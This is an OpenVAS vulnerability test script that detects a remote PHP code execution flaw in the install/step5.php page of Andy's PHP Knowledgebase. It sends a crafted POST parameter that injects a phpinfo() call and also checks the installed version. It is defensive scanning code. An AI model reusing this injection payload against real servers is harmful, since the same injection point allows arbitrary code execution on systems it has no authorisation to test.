###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_aphpkb_code_exec_vuln.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# Andy's PHP Knowledgebase 'step5.php' Remote PHP Code Execution Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation could allow remote attackers to execute
arbitrary PHP code within the context of the affected web server process.

Impact Level: Application";

tag_affected = "Andy's PHP Knowledgebase version 0.95.5 and prior.";

tag_insight = "The flaw is caused by improper validation of user-supplied
input passed via the 'install_dbuser' parameter to 'step5.php', that allows
attackers to execute arbitrary PHP code.";

tag_solution = "Upgrade to version 0.95.6 or later,
For updates refer to http://aphpkb.sourceforge.net";

tag_summary = "This host is running Andy's PHP Knowledgebase and is prone to
remote PHP code execution vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902519");
  script_version("$Revision: 9351 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2011-06-01 11:16:16 +0200 (Wed, 01 Jun 2011)");
  script_bugtraq_id(47918);
  script_tag(name:"cvss_base", value:"9.7");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:C/A:C");
  script_name("Andy's PHP Knowledgebase 'step5.php' Remote PHP Code Execution Vulnerability");
  script_xref(name : "URL" , value : "http://downloads.securityfocus.com/vulnerabilities/exploits/47918.txt");

  script_tag(name:"qod_type", value:"remote_active");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_aphpkb_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("aphpkb/installed");

  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");

port = get_http_port(default:80);
if(!dir = get_dir_from_kb(port:port, app:"aphpkb")){
  exit(0);
}

## Not a safe check
if(!safe_checks())
{

  host = http_host_name( port:port );

  url = string(dir, "/install/step5.php");
  postData = "install_dbuser=');phpinfo();//&submit=Continue";

  ## Construct XSS post attack request
  req = string("POST ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(postData),
               "\r\n\r\n", postData);

  ## Send post request
  res = http_keepalive_send_recv(port:port, data:req);

  ## Confirm exploit worked by checking the response
  if(http_vuln_check(port:port, url:url, pattern:'>phpinfo()<',
     extra_check: make_list('>System <', '>Configuration<', '>PHP Core<')))
  {
    security_message(port);
    exit(0);
  }
}

if(vers = get_version_from_kb(port:port, app:"aphpkb"))
{
  if(version_is_less_equal(version:vers, test_version:"0.95.5")){
    security_message(port:port);
  }
}
